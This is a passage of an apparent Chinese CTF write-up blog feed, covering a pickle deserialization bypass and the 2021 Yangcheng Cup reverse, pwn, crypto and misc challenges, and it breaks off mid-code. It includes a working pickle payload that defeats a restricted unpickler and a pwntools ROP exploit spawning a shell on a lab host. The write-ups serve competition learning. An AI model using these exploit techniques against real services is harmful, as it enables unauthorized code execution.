class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle，此外，禁止了<code>b&#39;R&#39;</code>。</p><p>目标是覆盖 <code>b</code> 中的验证，由于 <code>b</code> 被主程序引入，是存在于<code>__main__</code>下的 <code>b</code> 模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;sex&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;age&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">db0(S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">people</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou</span></span><br></pre></td></tr></table></figure><p>POST方式在 <code>/app</code> 路由传入参数 <code>data</code>，得到flag。</p><p><strong>FLAG:</strong> <code>flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-09-11T17:14:50.000Z</published>
    <updated>2021-09-11T19:04:16.364Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。</p><p>大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。</p><p>Rank: 企事业单位组12</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Ez-android"><a href="#Ez-android" class="headerlink" title="Ez_android"></a>Ez_android</h3><blockquote><p>Just an easy sign in!</p></blockquote><p>jadx查看<code>MainActivity</code>类。</p><p><code>onClink</code>函数先验证username和password，在资源文件查到username为<code>admin</code>，加密处理后的password值为<code>c232666f1410b3f5010dc51cec341f58</code>，又<code>getEncodeStr</code>函数对password的md5结果每一byte做了减1处理，还原得到<code>c33367701511b4f6020ec61ded352059</code>，查到对应的原值为<code>654321</code>。</p><p>接下来执行<code>getKeyAndRedirect</code>函数，传入password值<code>654321</code>，进入socket交互（<code>nc 139.224.191.201 20080</code>），输入password，拿到key字符串：</p><p>key=<code>TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</code></p><p>在<code>getKeyAndRedirect</code>函数中最后将key传递到<code>CheckFlagActivity</code>，在<code>CheckFlagActivity</code>中<code>checkFlag</code>函数调用<code>EncodeUtils</code>类实现base64编码，key为码表，encodeFlag为编码结果：</p><p>encodeFlag=<code>3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P</code></p><p>跑更换码表base64解码算法还原flag：SangFor{212f4548-03d1-11ec-ab68-00155db3a27e}</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h3><p>有<code>system</code>函数和<code>/cin/sh</code>，简单ROP，缺少的<code>/bin/sh\x00</code>可以用<code>sh\x00</code>代替。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.42.14&#x27;</span>, <span class="number">11000</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./BabyRop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0804c029</span></span><br><span class="line">system_addr = <span class="number">0x80490a0</span></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(sh_addr)</span><br><span class="line">pause()</span><br><span class="line">sl(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h3><blockquote><p>ring a ring a ring ring a ring a ring</p></blockquote><p>nc测试md5-PoW之后，需要输入100组a,b,c,d,e，使得 $a^4+b^4+c^4+d^4=e^2$，且都不能为0。</p><p>构造 $1^4+1^4+1^4+1^4=2^2$，再按倍数做乘积 $k^4+k^4+k^4+k^4=(2k^2)^2,k \in [1,100]$，得到100组用例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">prefix,s</span>):</span></span><br><span class="line"><span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:md5(x+prefix).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]==s,string.ascii_letters+string.digits,length=<span class="number">4</span>,method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;192.168.42.14&#x27;</span>,<span class="number">2378</span>)</span><br><span class="line">prefix, s = parse(<span class="string">&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;</span>,r.recvline())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] Give me xxxxx: &#x27;</span>,brute_force(prefix,s))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] a: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] b: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] c: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] d: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] e: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>*i*i))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="comment">#GWHT&#123;a_funny_equation&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-Rsa"><a href="#Easy-Rsa" class="headerlink" title="Easy_Rsa"></a>Easy_Rsa</h3><blockquote><p>你了解RSA吗???</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> n, e, c</span><br><span class="line"></span><br><span class="line">n, e, c = encrypt(<span class="number">1024</span>, <span class="number">0.48</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n =&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;e =&#x27;</span>, e</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c =&#x27;</span>, c</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line"><span class="comment"># e = 58337</span></span><br><span class="line"><span class="comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br></pre></td></tr></table></figure></blockquote><p>共素数攻击（common prime RSA）。</p><p>给出 $N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$，有 $N-1=2gh$，</p><p>所以 $x^{N-1} \pmod p$ 至多有 $a$ 个值，用 $x \rightarrow x^{N-1}+3$ 代替 Pollard’s rho算法中迭代函数，能在 $\text{O}(\sqrt{a})=\text{O}(N^{\frac{1}{4}-\frac{\gamma}{2}})$ 下分解 $N$。</p><p>common prime RSA在 $g$ 过小时， $g$ 也能轻易通过分解 $N-1$ 来解出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; in &#123;&#125; circle&#x27;</span>.<span class="built_in">format</span>(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h3><blockquote><p>BigRSA！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>尝试发现 $\gcd(n_1,n_2)=p$，分别求出 $q_1=n_1/p,q_2=n_2/p$，再用常规解密方法两步求出 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line">d1 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(c, d2, n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote><p>简简单单猜数字01-30 SangFor{md5(<strong>-</strong>-<strong>-</strong>…..)}（32位md5）</p></blockquote><p>12张图分别得到关键数字：28-08-30-07-04-20-02-17-23-01-12-19，md5得flag：SangFor{d93b7da38d89c19f481e710ef1b3558b}</p><p>​    </p><h3 id="Misc520"><a href="#Misc520" class="headerlink" title="Misc520"></a>Misc520</h3><blockquote><p>有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。</p></blockquote><p>拿到520.zip压缩包，循环嵌套着520层zip和story文件，脚本解压出所有文件（每次解压将story文件重命名防覆盖）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;520.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;~~&quot;</span>+now)</span><br><span class="line">    zfile = zipfile.ZipFile(now)</span><br><span class="line">    zfile.extractall(members=zfile.namelist())</span><br><span class="line">    zfile.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.remove(now)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    names = os.listdir()</span><br><span class="line">    os.rename(<span class="string">&#x27;story&#x27;</span>,<span class="string">&#x27;story&#x27;</span>+now.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(names)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        <span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">            now=name</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;~~~~&#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>解出最里层是一张flag.png图片，按大小排序目录下所有文件，发现story150内容与其他不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这都被你发现了？</span><br><span class="line">我这故事不错吧，嘻嘻嘻</span><br><span class="line">那就把flag给你吧</span><br><span class="line">oh，不，还有一半藏在了pcap的心里，快去找找吧</span><br><span class="line">左心房右心房，扑通扑通的心，咿呀咿呀的❤</span><br><span class="line">72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</span><br></pre></td></tr></table></figure><p>得到数字 <code>72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</code></p><p>根据提示，zsteg查看png图片存在lsb隐写，按bgr方式提取出一个zip加密压缩包，爆破得密码<code>12345</code>解出flag.pcap。</p><p>wireshark查看发现全为USB流量，tshark提取：</p><p><code>tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><p>将鼠标数据还原鼠标移动轨迹：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 